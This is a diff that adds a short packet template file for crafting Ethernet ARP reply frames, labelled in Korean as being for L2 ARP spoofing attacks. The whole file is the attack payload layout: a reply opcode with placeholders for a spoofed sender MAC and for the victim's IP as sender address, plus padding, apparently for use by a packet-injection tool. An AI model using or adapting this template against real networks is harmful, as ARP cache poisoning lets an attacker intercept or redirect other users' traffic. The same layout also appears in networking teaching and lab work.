@@ -1,0 +1,21 @@
+# ARP Reply Packet Template
+# L2 ARP Spoofing 공격용
+
+# L2 :: Ethernet HEADER
+@DMAC:6  # dst MAC
+@SMAC:6  # src MAC (spoofed)
+08 06    # Type: ARP
+
+# ARP Header
+00 01    # Hardware Type: Ethernet
+08 00    # Protocol Type: IP
+06       # Hardware Size: 6
+04       # Protocol Size: 4
+00 02    # Opcode: Reply (2)
+@SMAC:6  # Sender MAC Address (spoofed)
+@SIP:4   # Sender IP Address (spoofed - victim's IP)
+@DMAC:6  # Target MAC Address
+@DIP:4   # Target IP Address
+
+# Padding
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
